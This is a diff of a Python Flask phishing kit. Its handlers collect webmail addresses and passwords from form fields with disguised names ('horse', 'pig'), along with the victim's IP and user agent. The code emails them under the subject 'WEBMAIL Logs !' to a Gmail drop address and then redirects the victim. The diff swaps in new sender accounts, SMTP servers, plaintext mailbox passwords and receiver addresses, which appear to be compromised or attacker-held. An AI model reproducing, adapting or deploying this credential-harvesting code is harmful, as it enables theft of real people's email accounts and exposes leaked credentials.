@@ -145,10 +145,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "eissa@waterworldwaterpark.com"
-        sender_emaill = "eissa"
-        receiver_email = "s.toihidi@gmail.com"
-        password = "EISSA47314A"
+        sender_email = "Sharqiavehicles@sharqiavehicles.com"
+        sender_emaill = "Sharqiavehicles"
+        receiver_email = "lukeangus1989@gmail.com"
+        password = "nB1+WcG_+djw"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "WEBMAIL Logs !"
@@ -164,7 +164,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.waterworldwaterpark.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.sharqiavehicles.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -183,10 +183,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "eissa@waterworldwaterpark.com"
-        sender_emaill = "eissa"
-        receiver_email = "s.toihidi@gmail.com"
-        password = "EISSA47314A"
+        sender_email = "Sharqiavehicles@sharqiavehicles.com"
+        sender_emaill = "Sharqiavehicles"
+        receiver_email = "lukeangus1989@gmail.com"
+        password = "nB1+WcG_+djw"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "WEBMAIL logs !! "
@@ -202,7 +202,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.waterworldwaterpark.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.sharqiavehicles.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
